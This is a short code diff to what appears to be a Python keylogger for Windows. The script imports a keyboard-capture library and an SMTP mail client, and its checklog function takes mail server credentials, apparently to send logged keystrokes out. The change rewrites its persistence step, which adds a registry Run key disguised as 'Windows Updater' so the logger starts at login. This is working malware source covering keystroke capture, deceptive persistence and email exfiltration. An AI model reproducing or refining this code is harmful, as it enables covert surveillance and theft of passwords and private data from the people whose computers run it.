@@ -4,7 +4,7 @@ import win32console as wc
 import pynput.keyboard
 import threading as thread5
 import time 
-import sys,os
+import sys,os,subprocess
 import shutil
 from smtplib import SMTP
 import email.message
@@ -40,7 +40,7 @@ def startup():
 	
 	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater"').read()
 	if regquery.find(dirapp) < 0:
-		os.popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater" /t REG_SZ /d "cmd.exe /c ' + dirapp + '"')
+		subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater" /t REG_SZ /d "' + dirapp + '"', shell=True)
 		#os.popen("cmd.exe /c " + dirapp)
 
 def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
